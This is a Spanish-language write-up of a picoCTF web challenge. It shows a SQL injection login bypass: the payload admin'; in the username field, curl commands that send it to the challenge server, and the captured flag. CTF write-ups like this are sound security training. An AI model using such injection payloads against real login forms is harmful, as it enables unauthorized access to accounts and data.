## Objetivo 

There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

---
## Datos de acceso al nivel 

http://jupiter.challenges.picoctf.org:52849

---
## Solución 
Lo primero que tenemos que hacer es entrar al sitio el cual es prácticamente idéntico al anterior Irish-Name-Repo 1 en el apartado de login 

![[Pasted image 20231009202806.png]]
dentro de aquí inspeccionamos la pagina para habilitar un recuadro oculto de la misma forma que el anterior reto 

![[Pasted image 20231009202933.png]]

antes de empezar con la inyección la pagina ya cuenta con un una restricción por lo que si intentamos acceder de la misma forma que el reto anterior aparecerá lo siguiente  

![[Pasted image 20231009203126.png]]

para evitar esto ahora en el apartado de Username debemos colocar lo siguiente 

``` bash
admin';
```

![[Pasted image 20231009203227.png]]

al hacer esto ya no es necesario colocar alguna contraseña ya que el parámetro `admin';` en especial la ultima `;` invalida el campo de la contraseña 

![[Pasted image 20231009203339.png]]

**Resultado Final**
```
picoCTF{m0R3_SQL_plz_fa983901}
```

---
## Notas Adicionales 

Al igual que en el problema anterior también podemos acceder a la contraseña desde la linea de comando con los siguientes comandos, el primero hace uso de una contraseña cualquiera pero como anterior mente se menciono esta no es necesaria por lo que el segundo comando omite la contraseña y aun así al final muestran la llave   

``` bash
curl https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin';&password=admin&debug=1"
```

``` bash
curl https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin';&debug=1"
```

---
## Referencias 
[SQL Injection (w3schools.com)](https://www.w3schools.com/sql/sql_injection.asp)


